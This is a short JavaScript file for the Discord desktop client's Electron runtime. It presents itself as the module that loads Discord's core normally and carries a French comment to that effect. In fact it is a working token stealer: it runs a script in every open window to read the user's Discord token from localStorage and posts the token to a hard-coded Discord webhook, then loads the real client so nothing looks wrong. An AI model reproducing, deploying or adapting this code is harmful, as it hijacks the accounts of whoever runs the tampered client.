const { BrowserWindow, session } = require("electron");

function sendToWebhook(content) {
    const https = require("https");
    const data = JSON.stringify({
        content: content
    });

    const options = {
        hostname: "discord.com",
        path: "/api/webhooks/1372990357935231049/S3sJAliM2-iC1s9-lElmSGP73FPMKwRPIbiUBaU6Vc96kpu74qo4USkSeSB8U06klrpP",
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "Content-Length": data.length
        }
    };

    const req = https.request(options, res => {});
    req.write(data);
    req.end();
}

const getToken = () => {
    for (const win of BrowserWindow.getAllWindows()) {
        win.webContents.executeJavaScript(`
            localStorage.getItem("token");
        `).then(token => {
            sendToWebhook("Token Discord: " + token);
        });
    }
};

getToken();

// Charge le cœur de Discord normalement
module.exports = require('./core.asar');
